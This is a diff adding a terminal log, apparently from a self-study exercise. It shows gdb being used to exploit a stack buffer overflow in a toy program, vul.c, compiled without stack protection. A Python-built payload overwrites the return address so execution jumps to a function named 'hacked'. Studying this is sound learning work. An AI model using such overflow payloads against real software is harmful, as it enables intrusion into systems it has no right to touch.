@@ -1,0 +1,71 @@
+ivan@ubuntu:~/work/learning/gdb/str$ make
+gcc -c -g -fno-stack-protector vul.c -o vul.o
+gcc vul.o -o vul
+ivan@ubuntu:~/work/learning/gdb/str$ gdb ./vul 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./vul...done.
+(gdb) p hacked
+$1 = {void ()} 0x4005bd <hacked>
+(gdb) b vulf
+Breakpoint 1 at 0x4005e8: file vul.c, line 13.
+(gdb) r ABCDEFG
+Starting program: /home/ivan/work/learning/gdb/str/vul ABCDEFG
+
+Breakpoint 1, vulf (string=0x7fffffffe37f "ABCDEFG") at vul.c:13
+13	    strcpy(buffer, string);
+(gdb) bt
+#0  vulf (string=0x7fffffffe37f "ABCDEFG") at vul.c:13
+#1  0x000000000040061f in main (argc=2, argv=0x7fffffffdff8) at vul.c:18
+(gdb) i r
+rax            0x7fffffffe37f	140737488348031
+rbx            0x0	0
+rcx            0x0	0
+rdx            0x7fffffffe010	140737488347152
+rsi            0x7fffffffdff8	140737488347128
+rdi            0x7fffffffe37f	140737488348031
+rbp            0x7fffffffdef0	0x7fffffffdef0
+rsp            0x7fffffffded0	0x7fffffffded0
+r8             0x7ffff7dd4e80	140737351863936
+r9             0x7ffff7dea560	140737351951712
+r10            0x7fffffffdda0	140737488346528
+r11            0x7ffff7a36dd0	140737348070864
+r12            0x4004d0	4195536
+r13            0x7fffffffdff0	140737488347120
+r14            0x0	0
+r15            0x0	0
+rip            0x4005e8	0x4005e8 <vulf+12>
+eflags         0x202	[ IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/10xw $rbp
+0x7fffffffdef0:	0xffffdf10	0x00007fff	0x0040061f	0x00000000
+0x7fffffffdf00:	0xffffdff8	0x00007fff	0x00000000	0x00000002
+0x7fffffffdf10:	0x00000000	0x00000000
+(gdb) r $(python -c 'print "A"*0x10 + "B"*0x08 + "\xbd\x05\x40\x00"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/ivan/work/learning/gdb/str/vul $(python -c 'print "A"*0x10 + "B"*0x08 + "\xbd\x05\x40\x00"')
+
+Breakpoint 1, vulf (string=0x7fffffffe36b 'A' <repeats 16 times>, "BBBBBBBB\275\005@") at vul.c:13
+13	    strcpy(buffer, string);
+(gdb) finish
+Run till exit from #0  vulf (string=0x7fffffffe36b 'A' <repeats 16 times>, "BBBBBBBB\275\005@") at vul.c:13
+Enjoy your shell!
